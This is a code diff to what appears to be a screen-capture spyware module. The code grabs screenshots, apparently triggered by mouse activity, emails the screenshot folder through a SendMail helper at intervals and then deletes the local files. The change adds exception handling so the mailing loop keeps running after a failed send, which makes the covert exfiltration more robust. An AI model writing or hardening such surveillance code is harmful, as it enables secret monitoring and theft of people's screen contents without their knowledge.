@@ -1,3 +1,4 @@
+import logging
 import threading
 from pathlib import Path
 
@@ -5,6 +6,8 @@ from PIL import ImageGrab
 from pynput.mouse import Listener
 
 from mailLogger import SendMail
+
+logger = logging.getLogger(__name__)
 
 DEFAULT_SCREENSHOT_DIR = "./screenshot"
 DEFAULT_REPORT_INTERVAL = 30
@@ -61,10 +64,19 @@ class ScreenshotReporter:
         self._timer.start()
 
     def _report(self) -> None:
-        SendMail(str(self.screenshot_dir))
-        print("Mail Sent")
-        self.clean_directory()
-        self._schedule_report()
+        try:
+            SendMail(str(self.screenshot_dir))
+            print("Mail Sent")
+        except Exception:
+            logger.exception(
+                "SendMail failed for directory '%s'; "
+                "skipping clean and continuing report loop",
+                self.screenshot_dir,
+            )
+        else:
+            self.clean_directory()
+        finally:
+            self._schedule_report()
 
     def start_reporting(self) -> None:
         self._schedule_report()
